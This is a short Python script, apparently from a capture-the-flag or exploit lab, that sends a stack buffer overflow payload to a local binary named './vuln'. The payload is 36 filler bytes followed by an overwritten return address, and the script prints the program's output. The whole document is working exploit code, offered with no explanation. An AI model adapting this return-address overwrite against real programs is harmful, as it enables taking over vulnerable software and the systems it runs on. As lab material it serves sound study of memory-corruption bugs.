import struct, subprocess
p = b'A'*36 + struct.pack('<I', 0x08049276)
r = subprocess.run(['./vuln'], input=p+b'\n', capture_output=True, timeout=5)
print('OUT:', r.stdout.decode(errors='replace'))
print('ERR:', r.stderr.decode(errors='replace'))
